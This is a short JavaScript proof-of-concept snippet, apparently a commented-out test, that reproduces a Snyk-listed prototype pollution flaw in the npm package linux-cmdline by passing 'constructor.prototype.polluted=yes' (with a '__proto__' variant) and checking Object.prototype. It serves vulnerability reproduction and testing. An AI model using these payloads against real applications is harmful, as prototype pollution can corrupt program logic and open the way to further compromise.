// //https://snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674
// test("prototype pollution in linux-cmdline", () => {
console.log({}.polluted);

  const linuxCmdline = require("linux-cmdline");
  linuxCmdline("constructor.prototype.polluted=yes");
  //linuxCmdline("__proto__.polluted=yes");

console.log({}.polluted);
// });
